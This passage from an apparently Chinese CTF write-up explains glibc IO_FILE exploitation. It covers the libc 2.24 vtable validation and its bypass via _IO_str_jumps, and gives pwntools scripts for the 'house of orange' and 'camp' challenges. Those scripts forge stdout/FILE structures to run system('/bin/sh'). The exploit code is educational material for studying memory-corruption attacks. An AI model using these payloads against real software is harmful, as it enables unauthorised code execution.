payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c47a0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x00000000ffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>_IO_2_1_stderr_<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#完整地将stdout结构体重新设置，除了_flags设置为/bin/sh以及将vtable设置为stderr结构体的地址以外，其他的都不变，这样的话当执行printf时，会通过我们伪造的vtable指针找到sterr结构体来调用_IO_xsputn,实际上调用的是system函数，而stdout开头的值我们已经设置为了binsh，这样就能执行system("/bin/sh")了(因为要将stdout结构体全部设置，所以就不用IO_FILE结构体伪造模块了，那样会更加麻烦一些，毕竟有那么多的成员)</span>
<span class="token comment" spellcheck="true">#gdb.attach(io)</span>
stdout<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>泄露libc地址</p>
<p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/3.jpg" alt=""></p>
<p>修改前的stdout</p>
<p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/4.jpg" alt=""></p>
<p>修改后的stdout</p>
<p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/5.jpg" alt=""></p>
<p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/6.jpg" alt=""></p>
<p>修改后的stderr</p>
<p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/7.jpg" alt=""></p>
<p>这题除了用2.23下的做法以外还可以用2.24下的做法，之后会用2.24下的做法进行利用,也就是_IO_str_jumps(听说比赛的时候给的是2.23的libc，远程是2.24的，太屑了)</p>
<p>接下来进入高版本libc下IO_FILE的利用方法，也就是libc&gt;=2.24</p>
<p>相对于libc2.23以下的版本，2.24对vtable的位置进行了检查，检查内容如下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> _IO_jump_t <span class="token operator">*</span>
<span class="token function">IO_validate_vtable</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">struct</span> _IO_jump_t <span class="token operator">*</span>vtable<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token comment" spellcheck="true">/* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */</span>
  uintptr_t section_length <span class="token operator">=</span> __stop___libc_IO_vtables <span class="token operator">-</span> __start___libc_IO_vtables<span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> vtable<span class="token punctuation">;</span>
  uintptr_t offset <span class="token operator">=</span> ptr <span class="token operator">-</span> __start___libc_IO_vtables<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>offset <span class="token operator">>=</span> section_length<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">/* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */</span>
    <span class="token function">_IO_vtable_check</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> vtable<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>如果vtable的地址不在<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code>之间的话，就会调用<code>_IO_vtable_check</code>函数，<code>_IO_vtable_check</code>函数如下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> attribute_hidden
<span class="token function">_IO_vtable_check</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> SHARED</span>
  <span class="token comment" spellcheck="true">/* Honor the compatibility flag.  */</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>flag<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">atomic_load_relaxed</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>IO_accept_foreign_vtables<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> PTR_DEMANGLE</span>
  <span class="token function">PTR_DEMANGLE</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token operator">&amp;</span>_IO_vtable_check<span class="token punctuation">)</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>

  <span class="token comment" spellcheck="true">/* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  */</span>
  <span class="token punctuation">{</span>
    Dl_info di<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> link_map <span class="token operator">*</span>l<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>_dl_open_hook <span class="token operator">!=</span> <span class="token constant">NULL</span>
        <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_dl_addr</span> <span class="token punctuation">(</span>_IO_vtable_check<span class="token punctuation">,</span> <span class="token operator">&amp;</span>di<span class="token punctuation">,</span> <span class="token operator">&amp;</span>l<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>
            <span class="token operator">&amp;&amp;</span> l<span class="token operator">-></span>l_ns <span class="token operator">!=</span> LM_ID_BASE<span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

<span class="token macro property">#<span class="token directive keyword">else</span> </span><span class="token comment" spellcheck="true">/* !SHARED */</span>
  <span class="token comment" spellcheck="true">/* We cannot perform vtable validation in the static dlopen case
     because FILE * handles might be passed back and forth across the
     boundary.  Therefore, we disable checking in this case.  */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>__dlopen <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>

  <span class="token function">__libc_fatal</span> <span class="token punctuation">(</span><span class="token string">"Fatal error: glibc detected an invalid stdio handle\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p><code>_IO_vtable_check</code>函数会检查vtable是否是外部的合法vtable，如果不是则抛出错误</p>
<p>vtable的起始<code>__start___libc_IO_vtables</code>的地址为</p>
<pre class=" language-shell"><code class="language-shell">pwndbg> p &__start___libc_IO_vtables
$1 = (const char (*)[]) 0x7ffff7dce8c0 <_IO_helper_jumps></code></pre>
<p>vtable的结束<code>__stop___libc_IO_vtables</code>的地址为</p>
<pre class=" language-shell"><code class="language-shell">pwndbg> p &__stop___libc_IO_vtables
$2 = (const char (*)[]) 0x7ffff7dcf628</code></pre>
<p>我们在house of orange中将vtable伪造在了堆中，在camp中将vtable伪造在了<code>_IO_2_1_stderr_</code>中，2.24下首先检查vtable是否在<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code>之间，如果不是则检查是否是合法外部vtable，如果依然不是则抛出错误，2.23下的伪造方式显然不能通过2.24的检查。</p>
<p>根据大佬们的说法，可以利用<code>_IO_str_jumps</code>这个vtable，vtable如下</p>
<pre class=" language-c"><code class="language-c">pwndbg<span class="token operator">></span> p _IO_str_jumps 
$<span class="token number">19</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
  __dummy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
  __dummy2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
  __finish <span class="token operator">=</span> <span class="token number">0x7ffff7a906b0</span> <span class="token operator">&lt;</span>_IO_str_finish<span class="token operator">></span><span class="token punctuation">,</span> 
  __overflow <span class="token operator">=</span> <span class="token number">0x7ffff7a90310</span> <span class="token operator">&lt;</span>__GI__IO_str_overflow<span class="token operator">></span><span class="token punctuation">,</span> 
  __underflow <span class="token operator">=</span> <span class="token number">0x7ffff7a902b0</span> <span class="token operator">&lt;</span>__GI__IO_str_underflow<span class="token operator">></span><span class="token punctuation">,</span> 
  __uflow <span class="token operator">=</span> <span class="token number">0x7ffff7a8e900</span> <span class="token operator">&lt;</span>__GI__IO_default_uflow<span class="token operator">></span><span class="token punctuation">,</span> 
  __pbackfail <span class="token operator">=</span> <span class="token number">0x7ffff7a90690</span> <span class="token operator">&lt;</span>__GI__IO_str_pbackfail<span class="token operator">></span><span class="token punctuation">,</span> 
  __xsputn <span class="token operator">=</span> <span class="token number">0x7ffff7a8e960</span> <span class="token operator">&lt;</span>__GI__IO_default_xsputn<span class="token operator">></span><span class="token punctuation">,</span> 
  __xsgetn <span class="token operator">=</span> <span class="token number">0x7ffff7a8eaf0</span> <span class="token operator">&lt;</span>__GI__IO_default_xsgetn<span class="token operator">></span><span class="token punctuation">,</span> 
  __seekoff <span class="token operator">=</span> <span class="token number">0x7ffff7a907e0</span> <span class="token operator">&lt;</span>__GI__IO_str_seekoff<span class="token operator">></span><span class="token punctuation">,</span> 
  __seekpos <span class="token operator">=</span> <span class="token number">0x7ffff7a8eea0</span> <span class="token operator">&lt;</span>_IO_default_seekpos<span class="token operator">></span><span class="token punctuation">,</span> 
  __setbuf <span class="token operator">=</span> <span class="token number">0x7ffff7a8ed70</span> <span class="token operator">&lt;</span>_IO_default_setbuf<span class="token operator">></span><span class="token punctuation">,</span> 
  __sync <span class="token operator">=</span> <span class="token number">0x7ffff7a8f120</span> <span class="token operator">&lt;</span>_IO_default_sync<span class="token operator">></span><span class="token punctuation">,</span> 
  __doallocate <span class="token operator">=</span> <span class="token number">0x7ffff7a8ef10</span> <span class="token operator">&lt;</span>__GI__IO_default_doallocate<span class="token operator">></span><span class="token punctuation">,</span> 
  __read <span class="token operator">=</span> <span class="token number">0x7ffff7a90160</span> <span class="token operator">&lt;</span>_IO_default_read<span class="token operator">></span><span class="token punctuation">,</span> 
  __write <span class="token operator">=</span> <span class="token number">0x7ffff7a90170</span> <span class="token operator">&lt;</span>_IO_default_write<span class="token operator">></span><span class="token punctuation">,</span> 
  __seek <span class="token operator">=</span> <span class="token number">0x7ffff7a90140</span> <span class="token operator">&lt;</span>_IO_default_seek<span class="token operator">></span><span class="token punctuation">,</span> 
  __close <span class="token operator">=</span> <span class="token number">0x7ffff7a8f120</span> <span class="token operator">&lt;</span>_IO_default_sync<span class="token operator">></span><span class="token punctuation">,</span> 
  __stat <span class="token operator">=</span> <span class="token number">0x7ffff7a90150</span> <span class="token operator">&lt;</span>_IO_default_stat<span class="token operator">></span><span class="token punctuation">,</span> 
  __showmanyc <span class="token operator">=</span> <span class="token number">0x7ffff7a90180</span> <span class="token operator">&lt;</span>_IO_default_showmanyc<span class="token operator">></span><span class="token punctuation">,</span> 
  __imbue <span class="token operator">=</span> <span class="token number">0x7ffff7a90190</span> <span class="token operator">&lt;</span>_IO_default_imbue<span class="token operator">></span>
<span class="token punctuation">}</span>
</code></pre>
<p>这个vtable中的<code>_IO_str_finish</code>和<code>_IO_str_overflow</code>函数存在相对地址调用，首先看到<code>_IO_str_finish</code>，源码如下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">_IO_str_finish</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">int</span> dummy<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_USER_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_strfile <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token punctuation">)</span><span class="token operator">-></span>_s<span class="token punctuation">.</span>_free_buffer<span class="token punctuation">)</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
  fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

  <span class="token function">_IO_default_finish</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>当满足如下条件时</p>
<pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span>fp<span class="token operator">-></span>_IO_buf_base
<span class="token number">2</span><span class="token punctuation">.</span><span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_USER_BUF<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//_flags&amp;_IO_USER_BUF要为0，而#define _IO_USER_BUF 1，所以_flags的最后一位要为0</span></code></pre>
<p>便会调用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer)</code>，参数为<code>fp-&gt;_IO_buf_base</code>，我们可以将<code>fp-&gt;_s._free_buffer</code>伪造为system函数，将<code>fp-&gt;_IO_buf_base</code>设置为/bin/sh，那么<code>fp-&gt;_s._free_buffer</code>的偏移为多少，我们在gdb中使用如下命令查看</p>
<pre class=" language-shell"><code class="language-shell">pwndbg> p/x &((_IO_strfile *) stdout)->_s._free_buffer
$14 = 0x7ffff7dd36e8
pwndbg> p &_IO_2_1_stdout_ 
$15 = (struct _IO_FILE_plus *) 0x7ffff7dd3600 <_IO_2_1_stdout_>
pwndbg> p/x 0x7ffff7dd36e8-0x7ffff7dd3600
$16 = 0xe8</code></pre>
<p>可以得到<code>_s._free_buffer</code>相对于<code>IO_FILE</code>结构体的偏移为<code>0xe8</code>,类似的，用这几条命令查看_s._free_buffer相对于stdin和stderr的偏移也为0xe8</p>
<p>那么，该如何触发<code>fp-&gt;_s._free_buffer</code>？在house of orange的利用中，我们通过触发<code>_IO_flush_all_lockp</code>，并设置好IO_FILE中一些成员的值来满足约束，调用<code>_IO_OVERFLOW</code>函数，而<code>_IO_OVERFLOW</code>在vtable中的偏移为0x18，<code>_IO_finish</code>的偏移为0x10，在<code>_IO_str_jumps</code>中<code>_IO_str_finish</code>的偏移也为0x10，于是我们将vtable指向<code>_IO_str_jumps-8</code>，这样当调用<code>_IO_OVERFLOW</code>函数时实际上就是调用了<code>_IO_str_jumps</code>中的<code>_IO_str_finish</code>函数，在构造触发<code>_IO_OVERFLOW</code>的条件的同时，我们将<code>_IO_buf_base</code>设置为/bin/sh，将fp+0xe8设置为system。总结一下构造的条件如下</p>
<pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_flags<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">==</span><span class="token number">0</span>
fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> 
fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base
fp<span class="token operator">-></span>_IO_buf_base<span class="token operator">=</span>binsh
fp<span class="token operator">-></span>vtable<span class="token operator">=</span>_IO_str_jumps<span class="token number">-8</span>
fp<span class="token operator">+</span><span class="token number">0xe8</span><span class="token operator">=</span>system</code></pre>
<p>接下来我们用2.24下的做法来解决house of orange和camp这两道题，并且增加另外几道例题</p>
<p>house of orange的IO_FILE修改为如下</p>
<pre class=" language-python"><code class="language-python">pay <span class="token operator">=</span> <span class="token string">'e'</span><span class="token operator">*</span><span class="token number">0x400</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
fake_file <span class="token operator">=</span> IO_FILE_plus<span class="token punctuation">(</span><span class="token punctuation">)</span>
fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> <span class="token number">0</span>
fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span>
fake_file<span class="token punctuation">.</span>_IO_read_base<span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span>
fake_file<span class="token punctuation">.</span>_IO_buf_base<span class="token operator">=</span>binsh_addr
fake_file<span class="token punctuation">.</span>_IO_write_base<span class="token operator">=</span><span class="token number">0</span>
fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">1</span>
fake_file<span class="token punctuation">.</span>_mode<span class="token operator">=</span><span class="token number">0</span>
fake_file<span class="token punctuation">.</span>vtable<span class="token operator">=</span>_IO_str_jumps<span class="token number">-8</span>
pay <span class="token operator">+=</span> str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></code></pre>
<p>伪造的IO_FILE按照上面所说的条件进行构造，但并不是百分百的成功率，原因可以看这位师傅写的<a href="https://www.anquanke.com/post/id/168802" target="_blank" rel="noopener">新手向——IO_file全流程浅析</a></p>
<p>再看到camp的在2.24下的用法</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> pwn_debug <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./camp'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'camp'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/lib/freelibs/amd64/2.24-3ubuntu1_amd64/libc-2.24.so'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">stdout</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">stdin</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">stderr</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
stdout<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c2600</span>
<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
_IO_2_1_stderr_ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span>
binsh_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
_IO_str_jumps <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3be4c0</span>
_IO_2_1_stdin_ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>
_IO_2_1_stdout_ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stderr_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stderr_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'binsh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_str_jumps => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_str_jumps<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdin_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stdin_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stdout_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
payload=p64(0)*7+p64(system_addr)
stderr(len(payload),payload)

payload='/bin/sh\x00'+p64(libc_base+0x3c56a3)*7+p64(libc_base+0x3c56a4)+p64(0)*4
payload+=p64(_IO_2_1_stdin_)+p64(1)+p64(0xffffffffffffffff)+p64(0xa000000)+p64(libc_base+0x3c6780)
payload+=p64(0xffffffffffffffff)+p64(0)+p64(libc_base+0x3c47a0)+p64(0)*3
payload+=p64(0x00000000ffffffff)+p64(0)*2+p64(_IO_2_1_stderr_)
#gdb.attach(io)
stdout(len(payload),payload)
'''</span>
fake_file <span class="token operator">=</span> IO_FILE_plus<span class="token punctuation">(</span><span class="token punctuation">)</span>
fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> <span class="token number">0</span>
fake_file<span class="token punctuation">.</span>_IO_buf_base <span class="token operator">=</span> binsh_addr
fake_file<span class="token punctuation">.</span>_IO_write_base <span class="token operator">=</span> <span class="token number">0</span>
fake_file<span class="token punctuation">.</span>_IO_write_ptr <span class="token operator">=</span> <span class="token number">1</span>
fake_file<span class="token punctuation">.</span>_mode <span class="token operator">=</span> <span class="token number">0</span>
fake_file<span class="token punctuation">.</span>vtable <span class="token operator">=</span> _IO_str_jumps<span class="token number">-8</span>
payload <span class="token operator">=</span> str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>

stdout<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'256'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
